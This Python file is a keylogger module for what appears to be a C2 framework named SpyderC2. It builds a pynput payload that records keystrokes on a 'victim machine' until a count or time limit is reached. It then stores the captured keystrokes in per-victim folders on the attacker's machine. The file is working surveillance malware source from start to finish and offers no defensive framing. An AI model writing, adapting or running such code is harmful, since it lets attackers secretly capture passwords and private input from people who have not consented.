import sys
import os
import pathlib
import time
sys.path.append(os.path.join(str(pathlib.Path(__file__).parent.resolve()),'../../lib'))

from module import Module

class Keylogger(Module):
    description = 'Records keystrokes on the victim machine until duration or key count limit is reached.'

    @classmethod
    def module_options(cls):
        h = {
            'duration': {'desc': 'Maximum recording duration in seconds. Default is 30. Maximum is 120.', 'required': False},
            'count': {'desc': 'Maximum number of keystrokes to record. Default is 200.', 'required': False},
            'path': {'desc': 'Directory on the attacker machine where the log is saved. Default is shared/victim_data/<victim_id>.', 'required': False}
        }
        return h

    def __init__(self, name, utility, language, options):
        super(Keylogger, self).__init__(name, self.description, utility, language, getattr(self, f"script_{language}")(options))

    def handle_task_output(self, data, options, victim_id, task_id):
        dump_path = os.path.join(str(pathlib.Path(__file__).parent.resolve()), '../../shared/victim_data', victim_id)
        if not os.path.exists(dump_path):
            os.makedirs(dump_path)

        filename = f"keylog_{time.strftime('%Y%m%d-%H%M%S')}_{task_id}.txt"
        file_path = os.path.join(dump_path, filename)

        if 'path' in options:
            if os.path.exists(options['path']):
                file_path = os.path.join(options['path'], filename)

        if not os.access(os.path.dirname(file_path), os.W_OK):
            dump_path = os.path.join('/tmp', 'SpyderC2', victim_id)
            if not os.path.exists(dump_path):
                os.makedirs(dump_path, exist_ok=True)
            file_path = os.path.join(dump_path, filename)

        with open(file_path, 'w') as f:
            f.write(data.decode('utf-8', errors='ignore'))

        return file_path

    def script_python(self, options):
        duration = int(options.get('duration', 30))
        if duration > 120:
            duration = 120
        count = int(options.get('count', 200))

        return f"""def execute_command():
    from pynput import keyboard
    import threading
    import time

    keys = []
    stop_event = threading.Event()
    max_count = {count}
    max_duration = {duration}

    def on_press(key):
        try:
            keys.append(key.char)
        except AttributeError:
            keys.append(f'[{{str(key).replace("Key.", "")}}]')

        if len(keys) >= max_count:
            stop_event.set()
            return False

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    stop_event.wait(timeout=max_duration)
    listener.stop()

    output = f"Keylogger stopped after {{len(keys)}} keystrokes / {{max_duration}}s max\\n"
    output += f"Captured at: {{time.strftime('%Y-%m-%d %H:%M:%S')}}\\n"
    output += "-" * 40 + "\\n"
    output += ''.join(keys)

    return output
"""